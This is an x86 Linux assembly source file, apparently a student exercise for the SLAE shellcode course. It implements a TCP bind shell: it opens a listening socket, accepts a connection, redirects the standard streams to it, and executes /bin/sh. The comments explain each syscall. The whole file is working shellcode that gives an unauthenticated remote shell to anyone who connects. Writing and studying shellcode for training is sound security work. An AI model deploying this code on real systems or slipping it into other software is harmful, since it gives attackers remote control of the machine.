; Filename    : tcp_bind_shell.asm
; Author      : Joris Hartog
; Date        : 30-11-2015
; Student     : SLAE-704
; Size        : 
; Description : This program binds to a port, redirects 
;  STDIN, STDOUT and STDERR to that port and then executes
;  /bin/sh.

global _start

section .text

_start:

	;;;;;;;;;;;;;;;;;;;;;;;; Create a socket ;;;;;;;;;;;;;;;;;;;;;;;;
	; man:								;
        ;  int socketcall(int call, unsigned long *args);		;
        ;  int socket(int domain, int type, int protocol);		;
	; 								;
	; /usr/include/-i386-linux-gnu/asm/unistd_32.h:			;
	;  #define __NR_socketcall 102					;
	; 								;
	; /usr/include/linux/net.h:					;
	;  #define SYS_SOCKET 1						;
	; 								;
	; int domain := AF_INET = 2      (/usr/include/bits/socket.h)	;
	; int type := SOCK_STREAM = 1    (           ./socket_type.h)	;
	; int protocol := IPPROTO_IP = 0 (/usr/include/linux/in.h   )	;
	;								;
	; This is done by setting the following registers:		;
	;  eax := 102							;
	;  ebx := 1							;
	; *ecx := { 2, 1, 0 }						;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 

	xor eax, eax	; clear eax
	push eax	; stack := { 0 }
	mov al, 102	; eax := 102
	push byte 1
	pop ebx		; ebx := 1
	push ebx	; stack := { 1, 0 }
	push byte 0x2	; stack := { 2, 1, 0 }
	mov ecx, esp	; *esp := { 2, 1, 0 }

	int 0x80	; eax := socket file descriptor

	;;;;;;;;;;;;;;;;;;;;;;;; Bind the socket ;;;;;;;;;;;;;;;;;;;;;;;;
	; man:								;
	;  int bind(int sockfd, const struct sockaddr *addr, 		;
	;  	    socklen_t addrlen);					;
	;								;
	; /usr/include/linux/net.h:					;
	;  #define SYS_BIND 2						;
	;								;
	; The sockfd is currently stored in eax. The struct addr 	;
	; contains 3 variables: [sin_family, sin_port, sin_addr].	;
	;  sin_family := AF_INET = 2					;
	;  sin_port := 0xFFFF (We'll put the port in later)		;
	;  sin_addr := INADDR_ANY = 0					;
	; 								;
	; This is done by setting the following registers:		;
	;  eax := 102							;
	;  ebx := 2							;
	; *ecx := { sockfd, { 2, 0x...., 0 }, 16 }			;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	mov edx, eax	; save int sockfd for later
	xor eax, eax	; clear eax
	push eax	; stack := { 0 }
	push word 0x1234; stack := { 0x...., 0 }
	inc ebx		; ebx := 2
	push word bx	; stack := { 2, 0x...., 0 }
	mov esi, esp	; *esi := { 2, 0x...., 0 }

	push 16		; stack := { 16 }
	push esi	; stack := { { 2, 0x...., 0 }, 16 }
	push edx	; stack := { sockfd, { 2, 0x...., 0 }, 16 }
	mov ecx, esp	; *ecx := { sockfd, { 2, 0x...., 0 }, 16 }
	mov al, 102	; eax := 102

	int 0x80

	;;;;;;;;;;;;;;;;; Listen for incoming connecions ;;;;;;;;;;;;;;;;
        ; man:                                                          ;
	;  int listen(int sockfd, int backlog);				;
	;								;
	; /usr/include/linux/net.h:					;
	;  #define SYS_LISTEN 4						;
	;								;
	; Backlog will be set to zero and sockfd is saved in edx	;
	;								;
	; This is done by setting the following registers:		;
	;  eax := 102							;
	;  ebx := 4							;
	; *ecx := { sockfd, 0 }						;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	xor eax, eax	; clear eax
	push eax	; stack := { 0 }
	push edx	; stack := { sockfd, 0 }
	mov ecx, esp	; *ecx := { sockfd, 0 }
	mov bl, 4	; ebx := 4
	mov al, 102	; eax := 102

	int 0x80	

	;;;;;;;;;;;;;;;;;;;; Accept a new connection ;;;;;;;;;;;;;;;;;;;;
        ; man:								;
	;  int accept(int sockfd, struct sockaddr *addr,		;
	;	      socklen_t *addrlen);				;
	; 								;
	; /usr/include/linux/net.h:					;
	;  #define SYS_ACCEPT 5						;
	; 								;
	; Sockfd is still saved in edx. We don't care about the address ;
	; so addr and addrlen will be set to zero.			;
	;								;
	; This is done by setting the following registers:		;
	;  eax := 102							;
	;  ebx := 5							;
	; *ecx := { sockfd, 0, 0 }					;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	xor eax, eax	; clear eax
	push eax	; stack := { 0 }
	push eax	; stack := { 0, 0 }
	push edx	; stack := { sockfd, 0, 0 }
	mov ecx, esp	; *ecx := { sockfd, 0, 0 }
	inc ebx		; ebx := 5
	mov al, 102	; eax := 102

	int 0x80

	;;;;;;;;;; Redirect STDIN, STDOUT and STDERR with dup2 ;;;;;;;;;;
        ; man:                                                          ;
	;  int dup2(int oldfd, int newfd);				;
	;								;
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:			;
	;  #define __NR_dup2 63						;
	;								;
	; Int oldfd will be sockfd, which is stored in eax. Int newfd	;
	; is set to two and then decremented to redirect STDIN, STDOUT	;
	; and STDERR to the socket.					;
	;								;
	; This is done by settings the following registers:		:
	;  eax := 63							;
	;  ebx := sockfd						;
	;  ecx := 2 -> 1 -> 0						;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	push byte 2
	pop ecx		; ecx := 2
	mov ebx, eax	; ebx := sockfd
	
dup2:

	push byte 63
	pop eax		; eax := 63
	int 0x80	; execute dup2
	dec ecx		; ecx--

	jns dup2	; repeat until signed

	;;;;;;;;;;;;;;;;;;;;;;;; execve /bin/sh ;;;;;;;;;;;;;;;;;;;;;;;;;
        ; man:                                                          ;
	;  int execve(const char *filename, char *const argv[],		;
        ;             char *const envp[]);				;
	;								;
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:			;
	;  #define __NR_execve 11					;
        ;								;
	; This is done by setting the following registers:		;
	;  eax := 0x11							;
        ; *ebx := "/bin//sh"						;
        ; *ecx := ebx, 0x00000000					;
        ; *edx := 0x00000000						;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp

	push eax
	mov edx, esp

        push ebx
        mov ecx, esp

        mov al, 11
        int 0x80

